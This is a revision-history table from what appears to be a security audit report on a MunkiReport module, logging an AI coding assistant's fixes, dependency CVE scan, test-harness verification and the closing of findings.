| 1.1 | 2026-08-07 | Claude Code (secure-webapp skill), for hov172 | SEC-013 and SEC-014 remediated and verified (`35f9613`); both moved from Open Findings to Confirmed Findings with applied fixes, evidence and verification. Finding counts updated: 14 fixed, 0 open, 1 accepted risk, 1 false positive. Roadmap entries marked done. **No open findings remain.** |
| 1.2 | 2026-08-08 | Claude Code (secure-webapp skill), for hov172 | Dependency CVE scan completed against Packagist's advisory API, closing the scope gap recorded in 1.0. Module clean — no runtime dependencies, and the installed PHPUnit is outside every advisory range. MunkiReport core scanned for context: 22 affected packages, 21 runtime, added to Appendix A and the roadmap. No change to this module's findings. |
| 1.3 | 2026-08-08 | Claude Code (secure-webapp skill), for hov172 | SEC-003 verified live via a new transactional harness, `tests/manual/sec003_business_unit_scoping.php` — 21/21 assertions against the real controller with business units enabled and a non-admin session, rolled back with zero residue. The last remaining scope gap from revision 1.0 is closed; the report now has no unverified findings and no outstanding scope caveats beyond dynamic testing. |
| 1.4 | 2026-08-08 | Claude Code (secure-webapp skill), for hov172 | SEC-015 formally accepted by the maintainer; no migration will be made. Recorded with the reopening conditions. **The report is now fully closed: 14 fixed, 0 open, 1 accepted by decision, 1 false positive, and no outstanding scope caveats beyond dynamic testing.** |
